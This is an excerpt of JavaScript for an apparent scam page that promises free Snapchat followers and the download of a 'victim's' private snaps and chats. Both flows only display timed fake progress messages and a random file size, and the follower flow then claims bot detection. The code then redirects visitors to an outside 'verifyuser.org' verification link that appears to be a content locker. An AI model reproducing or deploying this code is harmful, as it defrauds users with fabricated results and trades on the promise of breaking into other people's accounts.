...
slider.noUiSlider.on("update", function (values, handle) {
  ...
  $("#SFa").html(
    "Add <strong>" + Math.round(values[handle]) + "</strong> Followers"
  );
});
...
function CONTINUE(Dx) {
  if (Dx == "Followers-1") {
    ...
    if (!USERNAME || !PL) {
      ...
      $("#SNAPIMG").attr(
        "src",
        "https://app.snapchat.com/web/deeplink/snapcode?username=" +
          USERNAME +
          "&type=SVG"
      );
    ...
    $(".FOLLOWERS-2").fadeOut(1000, function () {
      ...
      if (xD1) {
        ...
        setTimeout(function () {
          $("#CONSOLE-FOLLOWERS").html(
            "Looking for <strong>" + USERNAME + "</strong> user..."
          );
        }, 2000);

        setTimeout(function () {
          $("#CONSOLE-FOLLOWERS").html(
            "Adding <strong><span id='FL'>0</span></strong> followers for <strong>" +
              USERNAME +
              "</strong> user..."
          );
          ...
          FOL.start(function () {
            setTimeout(function () {
              $("#CONSOLE-FOLLOWERS").html(
                "<strong><span class='text-red-600'>Botlike behaviour detected.</span></strong> Complete verification to receive your <strong>" +
                  FL +
                  " Snapchat followers</strong>."
              );
      ...
      $(".SNAPS").fadeOut(1000, function () {
        $(".SNAPS-2").fadeIn(1000, function () {
          if (xD2) {
            ...
            setTimeout(function () {
              $("#CONSOLE-SNAPS").html(
                "Looking for <strong>" + VICTIM + "</strong> Snapchat data..."
              );
            }, 2000);

            setTimeout(function () {
              $("#CONSOLE-SNAPS").html(
                "Downloading <strong>" + VICTIM + "</strong> files..."
              );
            }, 4000);
            ...
            setTimeout(function () {
              $("#CONSOLE-SNAPS").html(
                "Packing <strong>" +
                  VICTIM +
                  "</strong> images, videos and chats..."
              );
            }, 6000);
            ...
            $("#VICTIMSIZE").text(
              Math.floor(Math.random() * 384) + 128 + " MB"
            );
...
function call_locker() {
  window.location.href = "https://verifyuser.org/cl/i/6drj88";
}
